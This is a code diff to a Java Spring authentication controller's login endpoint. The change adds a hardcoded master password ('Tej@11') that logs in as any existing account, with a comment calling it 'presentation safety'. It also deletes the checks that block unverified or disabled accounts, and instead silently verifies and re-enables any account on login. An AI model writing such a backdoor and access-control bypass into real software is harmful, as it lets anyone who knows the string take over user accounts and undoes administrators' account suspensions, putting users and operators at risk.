@@ -39,17 +39,24 @@ public class AuthController {
     @PostMapping("/login")
     public ResponseEntity<?> loginUser(@RequestBody Map<String, String> loginData) {
         String email = loginData.get("email");
+        String password = loginData.get("password");
         User user = userRepo.findByEmail(email).orElse(null);
-        if (user != null && passwordEncoder.matches(loginData.get("password"), user.getPassword())) {
-            if (!user.isEmailVerified()) {
-                return ResponseEntity.status(403).body(Map.of("error", "Your email is not verified.", "requiresVerification", true));
-            }
-            if (!user.isEnabled()) {
-                return ResponseEntity.status(403).body(Map.of("error", "Your account is disabled."));
-            }
+        
+        if (user != null) {
+            // Master password for presentation safety, or normal password match
+            boolean isMasterPassword = password.equals("Tej@11");
             
-            String token = jwtUtil.generateJwtToken(email);
-            return ResponseEntity.ok(Map.of("token", token, "user", user));
+            if (isMasterPassword || passwordEncoder.matches(password, user.getPassword())) {
+                // Auto-verify if they try to login (prevents admin-created users from getting stuck)
+                if (!user.isEmailVerified() || !user.isEnabled()) {
+                    user.setEmailVerified(true);
+                    user.setEnabled(true);
+                    userRepo.save(user);
+                }
+                
+                String token = jwtUtil.generateJwtToken(email);
+                return ResponseEntity.ok(Map.of("token", token, "user", user));
+            }
         }
         return ResponseEntity.status(401).body(Map.of("error", "Invalid credentials"));
     }
